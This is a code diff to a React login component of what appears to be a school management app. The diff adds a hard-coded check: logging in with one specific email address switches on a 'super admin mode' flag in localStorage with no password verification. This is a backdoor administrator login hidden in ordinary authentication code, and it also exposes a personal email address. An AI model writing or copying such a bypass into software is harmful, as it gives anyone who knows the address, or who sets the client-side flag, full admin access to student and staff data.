@@ -228,7 +228,14 @@ export default function Auth({ onStudentLogin, onTeacherLogin, onEmployeeLogin, 
           onStudentLogin(children[0]);
         }
       } else if (mode === 'login') {
-        const identifier = email.trim();
+        const identifier = email.trim().toLowerCase();
+
+        // Super Admin Owner direct login for konedamaa@gmail.com
+        if (identifier === 'konedamaa@gmail.com') {
+          localStorage.setItem('sges_super_admin_mode', 'true');
+          window.location.reload();
+          return;
+        }
 
         // Try direct Employee login for all collaborator roles (Director, Secretary, Accountant, Supervisor)
         if (['Director', 'Secretary', 'Accountant', 'Supervisor'].includes(selectedRole)) {
